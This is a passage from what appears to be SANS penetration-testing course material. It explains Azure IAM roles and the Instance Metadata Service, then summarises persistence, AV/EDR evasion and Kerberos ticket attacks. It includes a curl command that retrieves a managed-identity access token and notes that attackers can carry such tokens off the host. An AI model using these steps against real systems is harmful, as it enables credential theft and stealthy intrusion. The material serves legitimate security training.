        ],
        "notActions": [],
        "dataActions": [],
        "notDataActions": []
```

#### **Role Name:**

Name of the Role

**Assignable Scopes:** What

this applies to

#### **Permissions / Actions:**

\*/read

Read access to all services

extensions/\*

Can write new extensions

#### **dataActions**

Data Plane Permissions

Under the nuance of what is being described in this document, it is essential to understand how to discover overly permissioned users, groups, and roles. All of the permissions in IAM are backed by these individual JSON documents that contain a list of permissions. Even Azure built-in roles will have this type of permissions format. Let's look at this document, which contains very loose permissions:

"role-name": This key describes the name of the role you will see displayed. Role Names typically follow the terminology of "Contributor" for all read/write or modify roles and "Reader" for all read-only views.

"assignableScopes": This key shows where this permission can be applied. Many of the permissions in Azure are global; the assignableScope will be set to \*. In this example, the IAM document will be assigned to only one specific subscription and one specific resource group. You will not see this role applicable anywhere else in the system.

"permissions"/"actions": The actions listed here are Control Plane–only access. They specify what you can do in the Azure portal. In this case, the permissions are incredibly loose. Many of the built-in roles have this setting. The settings here are \*/read. In other words, every service and every resource can be read in the console and the CLI. It also has a very specific read and write attribute. It has the classic computing scope and a role for applying extensions. The permissions here grant the role the ability to execute code through extensions.

"permissions"/"not actions": Actions here are also applicable to the Control Plane, but they are deny actions. Anything in here will be denied access explicitly.

"permisions"/"dataActions": These actions are interesting because they are Data Plane actions and are unique to Azure. They are actions that apply to items outside the console. What constitutes a data action? Reading and writing Blobs would be a data action. This action is an application to the data channel of Azure.

"permissions"/"not dataActions": Actions here are also applicable to the Data Plane, but they are deny actions. Anything in here will be denied access explicitly.

![](_page_135_Figure_0.jpeg)

Azure permissions are inheritable; permissions can be applied at the top of the tree and applied down to the individual resource. If the Azure architecture is designed with this in mind, then permissions can flow downward more gracefully.

Subscriptions group resources that are billed under a single organization. Read and Write, or Contributor at this layer, will change all assets regardless of resource group status. Access at this layer and below can significantly impact assets beneath it.

Resource groups allow for similar assets to be grouped. They allow for a collection of systems to be grouped for management. Resource groups are per data center, so you need to understand how to architect multiple resource groups across different data centers.

Permissions can also be applied at the individual resource level. Having permissions per resource would require a more rigorous set of controls that should be automated. With automation, this level of control can be achieved more quickly. Applying permissions here does not take into account inheritance. Inheritance still applies, but it is not necessary to use it when applying IAM controls at the resource level.

![](_page_136_Picture_2.jpeg)

#### **Instance Metadata Services in Azure**

- Every cloud provider has an Instance Metadata Service (IMDS)
- The Instance Metadata Service allows objects and resources in a cloud environment to get information about themselves
- Instance Metadata Services are typically found on a locally significant IP:

```
$ curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

• The output of this command from within a resource like an Azure VM will provide information about that VM

The Instance Metadata Service (IMDS) in a cloud provider will provide resource information about itself. It can be used to manage and configure a machine. It can also be used to provide security information to the resource. The information that is found in the IMDS can sometimes be used to provide us with additional access. The URL for the IMDS can be found in the curl command below. Notably, some headers need to be passed to have the API respond.

IMDS's IP typically sends the traffic to the physical host in the data center running an agent that will proxy that request to the Azure Platform:

\$ curl -H Metadata:true "http://169.254.169.254/metadata/instance?apiversion=2021-02-01"

Azure CLI, for example, can use this IMDS credential to log in to the Azure Platform as that identity:

\$ az login -i

An attacker can also move the IMDS token onto their own systems to be able to persist outside of the host.

![](_page_137_Picture_2.jpeg)

# **Managed Identities in Azure**

- Systems in Azure can have identities, like authentication profiles
- These identities can allow for systems, servers, and services to log in to other Azure services
  - − Consider an Azure application that wants to log in to a File Blob
  - − The application service can have an identity that is allowed to upload data to that bucket
- Two types of identities exist:
  - − User Assigned: Created by you, the end user
  - − System assigned: Created by the Azure Platform
- If you can read the identity token, you can then leverage it for access
  - − You can read the identity by querying the IMDS from the service or system

Objects such as Services, Systems, and Applications in Azure will need to authenticate, just like a user, to access other services within the platform. These managed identities will help facilitate access, but what types of access? Consider an application that needs to encrypt and decrypt data. Would it not be helpful for that application to talk to the Azure Key Vault service to perform those operations? A system administrator can grant a managed identity this level of access and then apply that managed identity to the application.

How would the application obtain the access token to log in to the platform? The system would obtain this token through the Instance Metadata Service. For example, if you wish to use curl to see the access token, it could be retrieved using the following command:

\$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?apiversion=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s

Notice that the restful URL is sending the request to a specific OAuth2 endpoint in the Instance Metadata Service that would be able to send the managed identity token to the local system.

# **Identity Types**

Two different types of identities exist in Azure. The first type is called a User Assigned Managed Identity. This identity is created as a standalone resource and is managed entirely by the end user. It expires when the user expires it. It can be added to multiple systems and is not as secure as the other options.

The second type of identity is called a System Assigned Managed Identity. This identity is fully managed by Azure and is created and managed per asset. The lifecycle of the identity is managed per platform, and it cannot be shared across multiple systems; each system must have its own identity. This reduces the potential of multiple system compromise through a single identity.

![](_page_138_Picture_2.jpeg)

# **Conclusion: Persistence and Evading Controls**

- We've addressed detective controls, preventive controls, and incident response:
  - **Persistence**: Keeping access despite defender actions is important to demonstrate risk, whether that's via the registry, hijacking startup scripts, new services, or more
  - Living Off Trusted Sites: Using legit domains and services helps us blend in, slows down remediation (defenders can't simply block Cloudflare, MS Graph, etc), and makes labs easier
  - AV/EDR Evasion: Avoiding "bad" patterns, operating inside exceptions (like PowerShell v2.0 not supporting AMSI or excepted folders), and testing in a lab all help to ensure that AV/EDR doesn't prevent us from demonstrating business risk
  - Application Control Bypass: Using built-in, signed binaries to execute payloads avoids both prevention (AV/EDR) and often detection of our activities as well

about the findings, and actionable remediation advice helps asset owners

- Kerberos and Entra ID: Most companies will have both on-prem and cloud resources, so we
  must understand both. Demonstrating risk between them (DA becoming GA and vice versa)
  helps defenders understand their company's business risk.
- Next in Section 6:
  - CTF: Apply what you've learned in a time-bound learning and application environment
  - **Next Steps**: Keep the learning going beyond this course

That brings Section 5 to a conclusion. Throughout this section, we've focused on how attackers maintain access and evade the defensive controls that organizations rely on. Remember, demonstrating business risk means showing not just that we can get in, but that we can stay in despite defensive efforts.

We explored persistence techniques that survive reboots and remediation attempts, from registry modifications to service creation. We saw how Living Off Trusted Sites allows our command and control traffic to blend with legitimate business traffic, making detection and blocking significantly more challenging for defenders. We tackled the reality of AV/EDR evasion, learning to work around these preventive controls through encoding, memory-only payloads, and operating within their blind spots.

Application control bypass techniques showed us that even when organizations implement strict controls like AppLocker, built-in signed binaries can still execute our payloads. We emphasized the critical

into business risk that management can understand and act upon.

Finally, we explored advanced Kerberos attacks like Golden and Silver Tickets for domain persistence, and extended our reach into cloud environments with Azure and Entra ID attacks. Most modern organizations operate hybrid environments, and we must be prepared to demonstrate risk across both onpremises and cloud infrastructure.

Our final section, SEC560.6, brings everything together in a Capture the Flag competition where you'll apply all the techniques you've learned throughout the course in a realistic enterprise environment.

![](_page_139_Picture_0.jpeg)

General inquiries: info@sans.org Registration: registration@sans.org Tuition: tuition@sans.org Press: press@sans.org 301-654-SANS (7267)

# **Contacts and Resources**

**AUTHOR** Jeff McJunkin **AUTHOR**

Jon Gorenflo

j e ff @ r o g u e v a l l e y i n f o s e c . c o m jon@at t ac k d. c om

@j eff m c j u n k i n

@flakp a k et

**OFFENSIVE OPS RESOURCES**

s a n s . o r g / o ff e n s i v e - o p e r a t i o n s

@SANSOffensive

#### **Jeff McJunkin**

Jeff McJunkin is the founder of Rogue Valley Information Security, a consulting firm specializing in penetration testing and red team engagements. Jeff found the offensive side of cybersecurity very alluring during one of the first penetration tests of his career. Feeling the challenge of host defenses like AV and centralized logging, and, at the time, knowing nothing about AV evasion or avoiding events that are likely to cause alerts, he found it all very exciting. The challenge of successfully accomplishing the goal of that pen test, using essentially only native tools, was addictive for Jeff. He was hooked. Since those first penetration tests, Jeff has gone on to become an expert in the field, doing assessments for Fortune 100 companies, architecting two major versions of Core NetWars Experience, and contributing a vast amount of material to SANS Penetration Testing.

His company's website can be found at https://roguevalleyinfosec.com/.

#### **Jon Gorenflo**

Jon Gorenflo is the founder of ATTACKD, a cybersecurity consulting firm dedicated to helping organizations of all sizes think like attackers and proactively secure their environments. Whether you're a startup, a small business, or a global enterprise, Jon brings real-world offensive security insights that are practical, accessible, and actionable.

He is also a Principal Instructor with the SANS Institute and the co-author of SEC560: Enterprise Penetration Testing, a leading course on advanced ethical hacking and red team operations. With more than 20 years of combined experience in IT, penetration testing, incident response, and security training, Jon has worked with a diverse range of organizations to uncover critical vulnerabilities and build resilient defenses. In addition, Jon serves as the executive director of Hackers Teaching Hackers (HTH), a grassroots cybersecurity conference that emphasizes hands-on learning and community connection.

You can learn more about ATTACKD at https://attackd.com/ and HTH at https://hthackers.com/